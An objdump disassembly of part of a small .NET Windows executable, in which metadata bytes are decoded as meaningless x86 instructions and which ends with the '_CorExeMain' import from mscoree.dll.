  40c230:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c236:	0c 20                	or     $0x20,%al
  40c238:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c23d:	08 08                	or     %cl,(%eax)
  40c23f:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c245:	01 11                	add    %edx,(%ecx)
  40c247:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c24d:	02 12                	add    (%edx),%dl
  40c24f:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c252:	02 08                	add    (%eax),%cl
  40c254:	08 05 20 01 08 12    	or     %al,0x12080120
  40c25a:	25 06 00 02 08       	and    $0x8020006,%eax
  40c25f:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c264:	03 08                	add    (%eax),%ecx
  40c266:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c26b:	20 01                	and    %al,(%ecx)
  40c26d:	01 12                	add    %edx,(%edx)
  40c26f:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c275:	1c 0c                	sbb    $0xc,%al
  40c277:	07                   	pop    %es
  40c278:	06                   	push   %es
  40c279:	1c 02                	sbb    $0x2,%al
  40c27b:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c280:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c286:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c289:	02 07                	add    (%edi),%al
  40c28b:	20 02                	and    %al,(%edx)
  40c28d:	02 08                	add    (%eax),%cl
  40c28f:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c295:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c29b:	07                   	pop    %es
  40c29c:	0a 12                	or     (%edx),%dl
  40c29e:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c2a5:	08 12 81 
  40c2a8:	41                   	inc    %ecx
  40c2a9:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c2af:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c2b4:	4d                   	dec    %ebp
  40c2b5:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c2ba:	0e                   	push   %cs
  40c2bb:	05 00 00 12 81       	add    $0x81120000,%eax
  40c2c0:	41                   	inc    %ecx
  40c2c1:	05 20 00 12 81       	add    $0x81120020,%eax
  40c2c6:	55                   	push   %ebp
  40c2c7:	06                   	push   %es
  40c2c8:	00 00                	add    %al,(%eax)
  40c2ca:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c2cf:	00 01                	add    %al,(%ecx)
  40c2d1:	0e                   	push   %cs
  40c2d2:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c2d7:	01 11                	add    %edx,(%ecx)
  40c2d9:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c2e0:	41                   	inc    %ecx
  40c2e1:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c2e7:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c2ee:	49                   	dec    %ecx
  40c2ef:	0e                   	push   %cs
  40c2f0:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c2f6:	0e                   	push   %cs
  40c2f7:	0e                   	push   %cs
  40c2f8:	0e                   	push   %cs
  40c2f9:	0e                   	push   %cs
  40c2fa:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c2ff:	1c 07                	sbb    $0x7,%al
  40c301:	20 02                	and    %al,(%edx)
  40c303:	01 0e                	add    %ecx,(%esi)
  40c305:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c30b:	0a 02                	or     (%edx),%al
  40c30d:	10 07                	adc    %al,(%edi)
  40c30f:	06                   	push   %es
  40c310:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c316:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c31c:	0e                   	push   %cs
  40c31d:	02 05 20 00 12 81    	add    0x81120020,%al
  40c323:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c329:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c32f:	91                   	xchg   %eax,%ecx
  40c330:	04 20                	add    $0x20,%al
  40c332:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c335:	04 07                	add    $0x7,%al
  40c337:	02 02                	add    (%edx),%al
  40c339:	02 03                	add    (%ebx),%al
  40c33b:	20 00                	and    %al,(%eax)
  40c33d:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c340:	02 18                	add    (%eax),%bl
  40c342:	02 03                	add    (%ebx),%al
  40c344:	07                   	pop    %es
  40c345:	01 0e                	add    %ecx,(%esi)
  40c347:	05 00 00 12 81       	add    $0x81120000,%eax
  40c34c:	9d                   	popf
  40c34d:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c352:	1c 0a                	sbb    $0xa,%al
  40c354:	07                   	pop    %es
  40c355:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c35a:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c35f:	20 01                	and    %al,(%ecx)
  40c361:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c367:	0e                   	push   %cs
  40c368:	08 08                	or     %cl,(%eax)
  40c36a:	06                   	push   %es
  40c36b:	07                   	pop    %es
  40c36c:	02 02                	add    (%edx),%al
  40c36e:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c374:	0e                   	push   %cs
  40c375:	0e                   	push   %cs
  40c376:	0e                   	push   %cs
  40c377:	05 20 00 11 81       	add    $0x81110020,%eax
  40c37c:	ad                   	lods   %ds:(%esi),%eax
  40c37d:	05 00 00 12 81       	add    $0x81120000,%eax
  40c382:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c387:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c38d:	02 11                	add    (%ecx),%dl
  40c38f:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c395:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c39c:	12 81 8d 
  40c39f:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c3a5:	12 41 01             	adc    0x1(%ecx),%al
  40c3a8:	0e                   	push   %cs
  40c3a9:	05 20 01 01 13       	add    $0x13010120,%eax
  40c3ae:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c3b4:	00 06                	add    %al,(%esi)
  40c3b6:	00 02                	add    %al,(%edx)
  40c3b8:	0e                   	push   %cs
  40c3b9:	0e                   	push   %cs
  40c3ba:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c3bf:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c3c4:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c3ca:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c3d0:	c5 09                	lds    (%ecx),%ecx
  40c3d2:	00 02                	add    %al,(%edx)
  40c3d4:	02 11                	add    (%ecx),%dl
  40c3d6:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c3dc:	07                   	pop    %es
  40c3dd:	02 12                	add    (%edx),%dl
  40c3df:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c3e4:	01 02                	add    %eax,(%edx)
  40c3e6:	0e                   	push   %cs
  40c3e7:	10 02                	adc    %al,(%edx)
  40c3e9:	06                   	push   %es
  40c3ea:	00 01                	add    %al,(%ecx)
  40c3ec:	01 12                	add    %edx,(%edx)
  40c3ee:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c3f4:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c3fb:	0e                   	push   %cs
  40c3fc:	1c 11                	sbb    $0x11,%al
  40c3fe:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c404:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c40b:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c411:	05 07 20 02 12       	add    $0x12022007,%eax
  40c416:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c41d:	12 60 0e             	adc    0xe(%eax),%ah
  40c420:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c425:	12 60 12             	adc    0x12(%eax),%ah
  40c428:	60                   	pusha
  40c429:	06                   	push   %es
  40c42a:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c42f:	60                   	pusha
  40c430:	10 10                	adc    %dl,(%eax)
  40c432:	01 01                	add    %eax,(%ecx)
  40c434:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c439:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c43f:	1e                   	push   %ds
  40c440:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c443:	01 12                	add    %edx,(%edx)
  40c445:	60                   	pusha
  40c446:	09 20                	or     %esp,(%eax)
  40c448:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c44e:	13 00                	adc    (%eax),%eax
  40c450:	07                   	pop    %es
  40c451:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c456:	12 60 04             	adc    0x4(%eax),%ah
  40c459:	20 00                	and    %al,(%eax)
  40c45b:	13 00                	adc    (%eax),%eax
  40c45d:	05 20 01 02 13       	add    $0x13020120,%eax
  40c462:	00 03                	add    %al,(%ebx)
  40c464:	07                   	pop    %es
  40c465:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c46c:	e5 07                	in     $0x7,%eax
  40c46e:	20 01                	and    %al,(%ecx)
  40c470:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c476:	20 01                	and    %al,(%ecx)
  40c478:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c47e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c481:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c487:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c48d:	00 02                	add    %al,(%edx)
  40c48f:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c495:	0e                   	push   %cs
  40c496:	1c 00                	sbb    $0x0,%al
  40c498:	05 12 82 05 11       	add    $0x11058212,%eax
  40c49d:	82 09 0e             	orb    $0xe,(%ecx)
  40c4a0:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4a5:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c4ab:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4b0:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c4b6:	45                   	inc    %ebp
  40c4b7:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c4bd:	4d                   	dec    %ebp
  40c4be:	1c 12                	sbb    $0x12,%al
  40c4c0:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4c5:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4ca:	0e                   	push   %cs
  40c4cb:	0b 00                	or     (%eax),%eax
  40c4cd:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c4d3:	00 12                	add    %dl,(%edx)
  40c4d5:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c4dc:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c4e1:	4d                   	dec    %ebp
  40c4e2:	1c 12                	sbb    $0x12,%al
  40c4e4:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4e9:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4ee:	0e                   	push   %cs
  40c4ef:	17                   	pop    %ss
  40c4f0:	20 0a                	and    %cl,(%edx)
  40c4f2:	01 13                	add    %edx,(%ebx)
  40c4f4:	00 13                	add    %dl,(%ebx)
  40c4f6:	01 13                	add    %edx,(%ebx)
  40c4f8:	02 13                	add    (%ebx),%dl
  40c4fa:	03 13                	add    (%ebx),%edx
  40c4fc:	04 13                	add    $0x13,%al
  40c4fe:	05 13 06 13 07       	add    $0x7130613,%eax
  40c503:	13 08                	adc    (%eax),%ecx
  40c505:	13 09                	adc    (%ecx),%ecx
  40c507:	05 07 01 12 82       	add    $0x82120107,%eax
  40c50c:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c511:	0e                   	push   %cs
  40c512:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c517:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c51d:	06                   	push   %es
  40c51e:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c524:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c52a:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c52f:	20 01                	and    %al,(%ecx)
  40c531:	01 11                	add    %edx,(%ecx)
  40c533:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c53a:	82 31 05             	xorb   $0x5,(%ecx)
  40c53d:	20 00                	and    %al,(%eax)
  40c53f:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c545:	01 12                	add    %edx,(%edx)
  40c547:	61                   	popa
  40c548:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c54e:	08 20                	or     %ah,(%eax)
  40c550:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c556:	08 1a                	or     %bl,(%edx)
  40c558:	07                   	pop    %es
  40c559:	0a 12                	or     (%edx),%dl
  40c55b:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c562:	21 1d 05 
  40c565:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c56a:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c571:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c576:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c57c:	45                   	inc    %ebp
  40c57d:	08 08                	or     %cl,(%eax)
  40c57f:	04 07                	add    $0x7,%al
  40c581:	02 02                	add    (%edx),%al
  40c583:	08 09                	or     %cl,(%ecx)
  40c585:	00 02                	add    %al,(%edx)
  40c587:	01 12                	add    %edx,(%edx)
  40c589:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c58d:	4d                   	dec    %ebp
  40c58e:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c593:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c599:	05 08 05 07 07       	add    $0x7070508,%eax
  40c59e:	02 12                	add    (%edx),%dl
  40c5a0:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c5a4:	08 07                	or     %al,(%edi)
  40c5a6:	04 12                	add    $0x12,%al
  40c5a8:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c5ad:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c5b2:	1c 06                	sbb    $0x6,%al
  40c5b4:	07                   	pop    %es
  40c5b5:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c5bb:	20 01                	and    %al,(%ecx)
  40c5bd:	13 00                	adc    (%eax),%eax
  40c5bf:	08 04 07             	or     %al,(%edi,%eax,1)
  40c5c2:	01 12                	add    %edx,(%edx)
  40c5c4:	60                   	pusha
  40c5c5:	0e                   	push   %cs
  40c5c6:	07                   	pop    %es
  40c5c7:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c5cc:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c5d2:	12 60 07             	adc    0x7(%eax),%ah
  40c5d5:	07                   	pop    %es
  40c5d6:	04 08                	add    $0x8,%al
  40c5d8:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c5dd:	20 01                	and    %al,(%ecx)
  40c5df:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c5e5:	64 04 00             	fs add $0x0,%al
  40c5e8:	01 0b                	add    %ecx,(%ebx)
  40c5ea:	0a 04 00             	or     (%eax,%eax,1),%al
  40c5ed:	01 0b                	add    %ecx,(%ebx)
  40c5ef:	0e                   	push   %cs
  40c5f0:	04 00                	add    $0x0,%al
  40c5f2:	01 0b                	add    %ecx,(%ebx)
  40c5f4:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c5f9:	0c 06                	or     $0x6,%al
  40c5fb:	00 01                	add    %al,(%ecx)
  40c5fd:	0b 11                	or     (%ecx),%edx
  40c5ff:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c606:	04 00 01 
  40c609:	0a 0e                	or     (%esi),%cl
  40c60b:	04 00                	add    $0x0,%al
  40c60d:	01 0a                	add    %ecx,(%edx)
  40c60f:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c614:	0c 06                	or     $0x6,%al
  40c616:	00 01                	add    %al,(%ecx)
  40c618:	0a 11                	or     (%ecx),%dl
  40c61a:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c621:	04 00 01 
  40c624:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c629:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c62d:	ad                   	lods   %ds:(%esi),%eax
  40c62e:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c633:	0c 07                	or     $0x7,%al
  40c635:	07                   	pop    %es
  40c636:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c63c:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c641:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c647:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c64d:	12 60 1d             	adc    0x1d(%eax),%ah
  40c650:	0e                   	push   %cs
  40c651:	0e                   	push   %cs
  40c652:	08 12                	or     %dl,(%edx)
  40c654:	60                   	pusha
  40c655:	08 05 07 01 12 81    	or     %al,0x81120107
  40c65b:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c660:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c667:	05 08 08 06 00       	add    $0x60808,%eax
  40c66c:	02 07                	add    (%edi),%al
  40c66e:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c673:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c67a:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c680:	00 02                	add    %al,(%edx)
  40c682:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c688:	02 0b                	add    (%ebx),%cl
  40c68a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c68f:	02 06                	add    (%esi),%al
  40c691:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c696:	02 0a                	add    (%edx),%cl
  40c698:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c69d:	03 12                	add    (%edx),%edx
  40c69f:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c6a6:	07 02 12 
  40c6a9:	60                   	pusha
  40c6aa:	02 04 07             	add    (%edi,%eax,1),%al
  40c6ad:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c6b3:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c6b8:	04 1d                	add    $0x1d,%al
  40c6ba:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c6bf:	06                   	push   %es
  40c6c0:	07                   	pop    %es
  40c6c1:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c6c7:	00 01                	add    %al,(%ecx)
  40c6c9:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c6ce:	06                   	push   %es
  40c6cf:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c6d5:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c6db:	05 08 20 02 01       	add    $0x1022008,%eax
  40c6e0:	12 61 11             	adc    0x11(%ecx),%ah
  40c6e3:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c6e7:	04 12                	add    $0x12,%al
  40c6e9:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c6f0:	1d 05 00 
  40c6f3:	00 1c c7             	add    %bl,(%edi,%eax,8)
	...
  40c6fe:	00 00                	add    %al,(%eax)
  40c700:	3e c7 00 00 00 20 00 	movl   $0x200000,%ds:(%eax)
	...
  40c71b:	00 30                	add    %dh,(%eax)
  40c71d:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
	...
  40c72f:	00 00                	add    %al,(%eax)
  40c731:	00 5f 43             	add    %bl,0x43(%edi)
  40c734:	6f                   	outsl  %ds:(%esi),(%dx)
  40c735:	72 45                	jb     0x40c77c
  40c737:	78 65                	js     0x40c79e
  40c739:	4d                   	dec    %ebp
  40c73a:	61                   	popa
  40c73b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c742:	72 65                	jb     0x40c7a9
  40c744:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c748:	6c                   	insb   (%dx),%es:(%edi)
  40c749:	00 00                	add    %al,(%eax)
  40c74b:	00 00                	add    %al,(%eax)
  40c74d:	00 ff                	add    %bh,%bh
  40c74f:	25 00 20 40 00       	and    $0x402000,%eax
